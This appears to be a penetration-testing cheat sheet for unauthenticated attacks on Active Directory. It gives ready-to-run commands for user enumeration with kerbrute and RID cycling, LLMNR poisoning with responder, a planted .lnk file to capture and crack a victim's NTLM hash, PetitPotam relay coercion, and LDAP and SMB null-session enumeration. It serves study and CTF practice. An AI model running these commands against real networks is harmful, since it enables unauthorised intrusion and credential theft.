# Active Directory Methodology

### 1) Unauthenticated

1) User Enumeration

Enumerate possible names you might encounter, then use kerbrute to verify the validity of the users within the AD Domain

        kerbrute userenum -d DOMAIN --dc DC_IP users.txt

Blind user enumeration (No info)

        kerbrute userenum -d DOMAIN --dc DC_IP xato-10million-users.txt

Do the RID Cycling attack to enumerate users

        netexec smb IP -u anonymous -p '' --rid-brute > rid.txt

        cat rid.txt | grep SidTypeUser | awk '{print $6}' | awk -F\ '{print $2}' > users.txt

OR

        net rpc group members 'Domain Users' -W 'DOMAIN' -I IP -U '%'



2) LLMNR poisoning

Use responder to capture Net-NTLMv2 hash, then crack it with hashcat. The scenario could be mentioned somewhere in a CTF setup.

        sudo responder -I eth0

Then upload a .lnk file or similar to the target share/folder that points to our responder IP so that the victim will trigger the file and finally capture his hash.

        hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

3) PetitPotam (Unauth) CVE-2022-26925

If SMB signing is not enabled/enforced, you can conduct relay attacks. PetitPotam is one of them

        python3 PetitPotam.py -d DOMAIN ATTACK_IP TARGET_IP

4) LDAP Enumeration

If LDAP port is open, try to do an unauthenticated LDAP query.

Tools: ldapsearch, windapsearch, netexec, ldapdomaindump

Verify if you can use LDAP

        netexec ldap DC_IP

Use tools like ldapdomaindump or ldapsearch to dump LDAP information

        ldapsearch -x -h DC_IP -s base

        ldapdomaindump HOSTNAME

5) SMB Enumeration

Enumerate SMB shares for gathering information like AD credentials, users, etc

Tools: enum4linux, smbclient, netexec, smbmap

        enum4linux -a -u "" -p "" DC_IP && enum4linux -a -u "guest" -p "" DC_IP (Null session and guest access enumeration)

        smbmap -u "" -p "" -P 445 -H DC_IP && smbmap -u "guest" -p "" -P 445 -H DC_IP

        smbclient-U '%' -L //DC_IP && smbclient -U 'guest%' -L //DC_IP

        netexec smb IP -u '' -p '' (Null session)

        netexec smb IP -u 'a' -p '' (Anonymous logon)

